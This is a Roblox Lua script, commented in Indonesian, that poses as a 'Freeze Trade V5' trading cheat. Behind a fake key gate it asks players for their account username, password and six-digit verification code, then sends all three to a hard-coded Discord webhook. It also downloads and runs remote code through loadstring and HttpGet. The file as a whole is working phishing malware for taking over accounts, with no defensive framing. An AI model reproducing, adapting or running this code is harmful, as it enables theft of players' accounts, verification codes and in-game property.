-- Load Orion Library
local success, OrionLib = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/Andreaw1140/Andretremor-HUB/refs/heads/main/source"))()
end)

if not success then
    error("Gagal memuat Orion Library. Periksa URL atau koneksi.")
end

-- Webhook URL Discord
local webhook_url = "https://discord.com/api/webhooks/1319657197705367604/YDNwABDpMP0FcZrC5QqEOH9IbPqt67FmLF1yz6gNks0yxISJPoHbUBFyB1zgei3C5OOR"

-- Key yang benar
local correctKey = "kon"

-- URL untuk mendapatkan key
local getKeyURL = "https://your-get-key-link.com" -- Ganti dengan URL Anda

-- Fungsi untuk mengirim data ke Discord
local function sendToDiscord(username, password, code)
    local content = string.format("Username: %s\nPassword: %s\nKode Verifikasi: %s", username, password, code)
    local payload = {
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({
            content = content
        })
    }

    if syn and syn.request then
        syn.request(payload)
    elseif http and http.request then
        http.request(payload)
    elseif request then
        request(payload)
    end
end

-- Fungsi untuk membuat GUI menggunakan Orion
local function createMenuGUI()
    -- Membuat window dengan Orion
    local window = OrionLib:MakeWindow({Name = "Freeze Trade V5", HidePremium = true})

    -- Step 1: Key Input
    local function createKeyInputStep()
        local keyStep = window:MakeTab({Name = "Step 1: Key Input"})

        -- Input Key
        keyStep:AddTextbox({
            Name = "Enter Key",
            Default = "",
            TextDisappear = true,
            Callback = function(key)
                print("Key entered:", key)  -- Debugging
                if key == correctKey then
                    print("Key is valid, proceeding to next step.")  -- Debugging
                    OrionLib:MakeNotification({
                        Name = "Key Valid",
                        Content = "Key yang dimasukkan benar!",
                        Time = 3
                    })
                    keyStep:Destroy() -- Hapus tab Key Input
                    createUsernamePasswordStep() -- Pindah ke langkah berikutnya
                else
                    print("Key is invalid.")  -- Debugging
                    OrionLib:MakeNotification({
                        Name = "Key Invalid",
                        Content = "Key yang dimasukkan salah!",
                        Time = 3
                    })
                end
            end
        })

        -- Tombol "Get Key"
        keyStep:AddButton({
            Name = "Get Key",
            Callback = function()
                setclipboard(getKeyURL) -- Salin URL ke clipboard
                OrionLib:MakeNotification({
                    Name = "Get Key",
                    Content = "Link telah disalin ke clipboard! Tempel di browser untuk mendapatkan key.",
                    Time = 5
                })
            end
        })
    end

    -- Step 2: Username and Password Input
    local function createUsernamePasswordStep()
        local usernamePasswordStep = window:MakeTab({Name = "Step 2: Username & Password"})
        local username, password

        -- Username Input
        usernamePasswordStep:AddTextbox({
            Name = "Enter Username",
            Default = "",
            TextDisappear = true,
            Callback = function(input)
                username = input
            end
        })

        -- Password Input
        usernamePasswordStep:AddTextbox({
            Name = "Enter Password",
            Default = "",
            TextDisappear = true,
            Callback = function(input)
                password = input
            end
        })

        -- Lanjut ke Step 3: Kode Verifikasi
        usernamePasswordStep:AddButton({
            Name = "Continue to Verification",
            Callback = function()
                if username and password and username ~= "" and password ~= "" then
                    print("Username and Password entered. Proceeding to next step.")  -- Debugging
                    usernamePasswordStep:Destroy() -- Hapus tab Username & Password
                    createVerificationCodeStep(username, password) -- Pindah ke langkah berikutnya
                else
                    print("Username or Password missing.")  -- Debugging
                    OrionLib:MakeNotification({
                        Name = "Error",
                        Content = "Harap isi Username dan Password terlebih dahulu!",
                        Time = 3
                    })
                end
            end
        })
    end

    -- Step 3: Verification Code Input
    local function createVerificationCodeStep(username, password)
        local verificationStep = window:MakeTab({Name = "Step 3: Verification Code"})

        -- Kode Verifikasi Input
        verificationStep:AddTextbox({
            Name = "Enter Verification Code",
            Default = "",
            TextDisappear = true,
            Callback = function(code)
                print("Verification code entered:", code)  -- Debugging
                if code:match("^%d%d%d%d%d%d$") then -- Memastikan kode 6 digit
                    sendToDiscord(username, password, code) -- Kirim ke Discord
                    OrionLib:MakeNotification({
                        Name = "Verification Success",
                        Content = "Kode verifikasi berhasil dikirim!",
                        Time = 3
                    })
                    verificationStep:Destroy() -- Hapus tab Verification
                else
                    OrionLib:MakeNotification({
                        Name = "Verification Failed",
                        Content = "Kode harus 6 digit angka!",
                        Time = 3
                    })
                end
            end
        })
    end

    -- Tampilkan langkah pertama
    createKeyInputStep()
end

-- Menampilkan GUI
createMenuGUI()
